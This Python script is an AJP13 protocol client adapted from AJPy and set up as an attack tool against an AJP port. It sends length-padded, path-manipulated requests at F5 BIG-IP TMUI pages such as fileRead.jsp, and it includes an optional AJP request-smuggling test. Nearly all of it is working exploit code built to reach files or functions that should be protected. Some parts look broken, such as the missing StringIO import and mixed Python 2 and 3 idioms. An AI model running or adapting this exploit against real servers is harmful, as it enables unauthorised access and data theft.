import struct
import argparse
import socket


# https://github.com/hypn0s/AJPy/blob/master/ajpy/ajp.py
def pack_string(s):
	if s is None:
		return struct.pack(">h", -1)
	l = len(s)
	return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)

def unpack(stream, fmt):
	size = struct.calcsize(fmt)
	buf = stream.read(size)
	return struct.unpack(fmt, buf)

def unpack_string(stream):
	size, = unpack(stream, ">h")
	if size == -1: # null string
		return None
	res, = unpack(stream, "%ds" % size)
	stream.read(1) # \0
	return res
	
class NotFoundException(Exception):
	pass

class AjpBodyRequest(object):
	# server == web server, container == servlet
	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
	MAX_REQUEST_LENGTH = 8186

	def __init__(self, data_stream, data_len, data_direction=None):
		self.data_stream = data_stream
		self.data_len = data_len
		self.data_direction = data_direction

	def serialize(self):
		# from file
		# data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
		# from string
		data = self.data_stream
		if len(data) == 0:
			return struct.pack(">bbH", 0x12, 0x34, 0x00)
		else:
			res = struct.pack(">H", len(data))
			res += data
		if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
			header = struct.pack(">bbH", 0x12, 0x34, len(res))
		else:
			header = struct.pack(">bbH", 0x41, 0x42, len(res))

		return header + res


	def send_and_receive(self, socket, stream):
		while True:
			data = self.serialize()
			socket.send(data)
			r = AjpResponse.receive(stream)
			while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
				r = AjpResponse.receive(stream)

			if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
				break


class AjpForwardRequest(object):
	"""
	AJP13_FORWARD_REQUEST :=
		prefix_code	  (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
		method		   (byte)
		protocol		 (string)
		req_uri		  (string)
		remote_addr	  (string)
		remote_host	  (string)
		server_name	  (string)
		server_port	  (integer)
		is_ssl		   (boolean)
		num_headers	  (integer)
		request_headers *(req_header_name req_header_value)
		attributes	  *(attribut_name attribute_value)
		request_terminator (byte) OxFF

	"""
	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)

	REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}
	# server == web server, container == servlet
	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)

	COMMON_HEADERS = ["SC_REQ_ACCEPT",
		"SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION", 
		"SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
		"SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
	]

	ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]

	def __init__(self, data_direction=None):
		self.prefix_code = 0x02
		self.method = None
		self.protocol = None   
		self.req_uri = None  
		self.remote_addr = None   
		self.remote_host = None
		self.server_name = None
		self.server_port = None
		self.is_ssl = None
		self.num_headers = None
		self.request_headers = None
		self.attributes = None
		self.data_direction = data_direction

	def pack_headers(self):
		"""
			req_header_name := 
				sc_req_header_name | (string)  [see below for how this is parsed]
			sc_req_header_name := 0xA0xx (integer)
			req_header_value := (string)
			accept  0xA001  SC_REQ_ACCEPT
			accept-charset  0xA002  SC_REQ_ACCEPT_CHARSET
			accept-encoding 0xA003  SC_REQ_ACCEPT_ENCODING
			accept-language 0xA004  SC_REQ_ACCEPT_LANGUAGE
			authorization   0xA005  SC_REQ_AUTHORIZATION
			connection  0xA006  SC_REQ_CONNECTION
			content-type	0xA007  SC_REQ_CONTENT_TYPE
			content-length  0xA008  SC_REQ_CONTENT_LENGTH
			cookie  0xA009  SC_REQ_COOKIE
			cookie2 0xA00A  SC_REQ_COOKIE2
			host	0xA00B  SC_REQ_HOST
			pragma  0xA00C  SC_REQ_PRAGMA
			referer 0xA00D  SC_REQ_REFERER
			user-agent  0xA00E  SC_REQ_USER_AGENT
			store headers as dict 
		"""
		self.num_headers = len(self.request_headers)
		res = ""
		res = struct.pack(">h", self.num_headers)
		for h_name in self.request_headers:
			if h_name.startswith("SC_REQ"):
				code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
				res += struct.pack("BB", 0xA0, code)
			else:
				res += pack_string(h_name)
			res += pack_string(self.request_headers[h_name])
			
		return res

	def pack_attributes(self):
		"""
			Information Code Value  Note
			?context	0x01	Not currently implemented
			?servlet_path   0x02	Not currently implemented
			?remote_user	0x03	
			?auth_type  0x04	
			?query_string   0x05	
			?route  0x06	
			?ssl_cert   0x07	
			?ssl_cipher 0x08	
			?ssl_session	0x09	
			?req_attribute  0x0A	Name (the name of the attribut follows)
			?ssl_key_size   0x0B	
			?secret 0x0C	
			?stored_method  0x0D	
			are_done	0xFF	request_terminator
		"""
		res = b""
		for attr in self.attributes:
			a_name = attr['name']
			code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
			res += struct.pack("b", code)
			if a_name == "req_attribute":
				aa_name, a_value = attr['value']
				res += pack_string(aa_name)
				res += pack_string(a_value)
			else:
				res += pack_string(attr['value'])
		res += struct.pack("B", 0xFF)
		return res

	def serialize(self):
		res = ""
		res = struct.pack("bb", self.prefix_code, self.method)
		res += pack_string(self.protocol)
		res += pack_string(self.req_uri)
		res += pack_string(self.remote_addr)
		res += pack_string(self.remote_host)
		res += pack_string(self.server_name)
		res += struct.pack(">h", self.server_port)
		res += struct.pack("?", self.is_ssl)
		res += self.pack_headers()
		res += self.pack_attributes()

		if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
			header = struct.pack(">bbh", 0x12, 0x34, len(res))
		else:
			header = struct.pack(">bbh", 0x41, 0x42, len(res))
		return header + res

	def parse(self, raw_packet):
		stream = StringIO(raw_packet)
		self.magic1, self.magic2, data_len = unpack(stream, "bbH")
		self.prefix_code, self.method = unpack(stream, "bb")
		self.protocol = unpack_string(stream)
		self.req_uri = unpack_string(stream)
		self.remote_addr = unpack_string(stream)
		self.remote_host = unpack_string(stream)
		self.server_name = unpack_string(stream)
		self.server_port = unpack(stream, ">h")
		self.is_ssl = unpack(stream, "?")
		self.num_headers, = unpack(stream, ">H")
		self.request_headers = {}
		for i in range(self.num_headers):
			code, = unpack(stream, ">H")
			if code > 0xA000:
				h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
			else:
				h_name = unpack(stream, "%ds" % code)
				stream.read(1) # \0

			h_value = unpack_string(stream)

			self.request_headers[h_name] = h_value

	def send_and_receive(self, socket, stream, save_cookies=False):
		# print("enter send_and_receive")
		res = []
		i = socket.sendall(self.serialize())
		if self.method == AjpForwardRequest.POST:
			return res
		r = AjpResponse.receive(stream)
		assert r.prefix_code == AjpResponse.SEND_HEADERS
		res.append(r)
		if save_cookies and 'Set-Cookie' in r.response_headers:
			self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']
		# read body chunks and end response packets
		while True:
			r = AjpResponse.receive(stream)
			res.append(r)
			if r.prefix_code == AjpResponse.END_RESPONSE:
				break
			elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
				continue
			else:
				raise NotImplementedError
				break
		return res

class AjpResponse(object):
	"""
		AJP13_SEND_BODY_CHUNK := 
	  	  prefix_code   3
	  	  chunk_length  (integer)
	  	  chunk		*(byte)

		AJP13_SEND_HEADERS :=
	  	  prefix_code	   4
	  	  http_status_code  (integer)
	  	  http_status_msg   (string)
	  	  num_headers	   (integer)
	  	  response_headers *(res_header_name header_value)

		res_header_name := 
			sc_res_header_name | (string)   [see below for how this is parsed]

		sc_res_header_name := 0xA0 (byte)
		header_value := (string)
		AJP13_END_RESPONSE :=
	  	  prefix_code	   5
	  	  reuse			 (boolean)


		AJP13_GET_BODY_CHUNK :=
	  	  prefix_code	   6
	  	  requested_length  (integer)
	"""

	# prefix codes
	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)

	# send headers codes
	COMMON_SEND_HEADERS = [
			"Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified", 
			"Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
			]

	def parse(self, stream):
		# read headers
		self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")

		if self.prefix_code == AjpResponse.SEND_HEADERS:
			self.parse_send_headers(stream)
		elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
			self.parse_send_body_chunk(stream)
		elif self.prefix_code == AjpResponse.END_RESPONSE:
			self.parse_end_response(stream)
		elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
			self.parse_get_body_chunk(stream)
		else:
			raise NotImplementedError

	def parse_send_headers(self, stream):
		self.http_status_code, = unpack(stream, ">H")
		self.http_status_msg = unpack_string(stream)
		self.num_headers, = unpack(stream, ">H")
		self.response_headers = {}
		for i in range(self.num_headers):
			code, = unpack(stream, ">H")
			if code <= 0xA000: # custom header
				h_name, = unpack(stream, "%ds" % code)
				stream.read(1) # \0
				h_value = unpack_string(stream)
			else:
				h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]
				h_value = unpack_string(stream)
			self.response_headers[h_name] = h_value

	def parse_send_body_chunk(self, stream):
		self.data_length, = unpack(stream, ">H")
		self.data = stream.read(self.data_length+1)

	def parse_end_response(self, stream):
		self.reuse, = unpack(stream, "b")

	def parse_get_body_chunk(self, stream):
		rlen, = unpack(stream, ">H")
		return rlen

	@staticmethod
	def receive(stream):
		r = AjpResponse()
		r.parse(stream)
		return r


# https://github.com/hypn0s/AJPy/blob/master/tomcat.py
def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
	# fr = AjpForwardRequest(AjpForwardRequest.CONTAINER_TO_SERVER)
	
	fr.method = method
	fr.protocol = "HTTP/1.1"
	fr.req_uri = req_uri
	fr.remote_addr = target_host
	fr.remote_host = None
	fr.server_name = target_host
	fr.server_port = 80
	fr.request_headers = {
		'SC_REQ_ACCEPT': 'text/html',
		'SC_REQ_CONNECTION': 'keep-alive',
		'SC_REQ_CONTENT_LENGTH': '0',
		'SC_REQ_HOST': target_host,
		'SC_REQ_USER_AGENT': 'Mozilla',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'en-US,en;q=0.5',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0'
	}
	fr.is_ssl = False
	fr.attributes = []
	return fr

class Tomcat(object):
	def __init__(self, target_host, target_port):
		self.target_host = target_host
		self.target_port = target_port

		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.connect((target_host, target_port))
		self.stream = self.socket.makefile("rb")


	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
		self.req_uri = req_uri
		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))

		print("\n[-]Request at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))

		if user is not None and password is not None:
			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
		for h in headers:
			self.forward_request.request_headers[h] = headers[h]
		for a in attributes:
			self.forward_request.attributes.append(a)

		# send data and receive result
		responses = self.forward_request.send_and_receive(self.socket, self.stream)
		if len(responses) == 0:
			return None, None
		snd_hdrs_res = responses[0]
		data_res = responses[1:-1]
		if len(data_res) == 0:
			print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
		return data_res



	def get_data(self, req_uri):
		return self.perform_request(req_uri=req_uri)


	def post_data(self, req_uri, data=b"test"):
		data_len = len(data)
		# headers = {
		# 		"SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
		# 		"SC_REQ_CONTENT_LENGTH": "%d" % data_len,
		# }
		# for test_for_ajp_smuggling
		# headers = {
		# 		"SC_REQ_CONTENT_TYPE": "application/x-www-form-urlencoded",
		# 		# for test_for_ajp_smuggling
		# 		"Transfer-Encoding": "gzip,chunked"
		# }

		headers = {}
		attributes = [
			# {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/tmui/tmui/locallb/workspace/list.jsp",)},
			# {"name": "req_attribute", "value": ("javax.servlet.include.path_info", "/tmui/locallb/workspace/list.jsp",)},
			# {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/tmui",)},
		]
		self.perform_request(req_uri=req_uri, headers=headers, method='POST',attributes = attributes)


		br = AjpBodyRequest(data, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
		br.send_and_receive(self.socket, self.stream)

		r = AjpResponse.receive(self.stream)
		# print(r.data)
		return r.data


def get_test(ip, port):
	tc = Tomcat(ip, port)
	data = tc.get_data('/111.txt')
	print('\n[+]result:')
	for d in data:
		print(d.data)


def post_test(ip, port):
	tc = Tomcat(ip, port)
	total_len = 272
	url_path = '/tmui/tmui/locallb/workspace/list.jsp'
	url_path = '/tmui/tmui/locallb/workspace/fileRead.jsp'
	print((total_len-len(url_path)))
	ret= tc.post_data('/'*(total_len-len(url_path)) + url_path, b"test")
	# ret= tc.post_data('/post.jsp', b"data=xxxxtestxxxx")
	print('\n[+]result:')
	print(ret)


def test_for_ajp_smuggling(ip, port):
	tc = Tomcat(ip, port)
	
	# data = b'x'*516
	f1 = open('read.dat', 'rb')
	data = f1.read()
	print(data)
	ret= tc.post_data('/post.jsp', data)
	print('\n[+]result:')
	print(ret)


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("target", type=str, help="Hostname or IP to attack")
	parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
	args = parser.parse_args()

	ip = args.target
	port = args.port

	# get_test(ip, port)
	post_test(ip, port)

	# test_for_ajp_smuggling(ip, port)






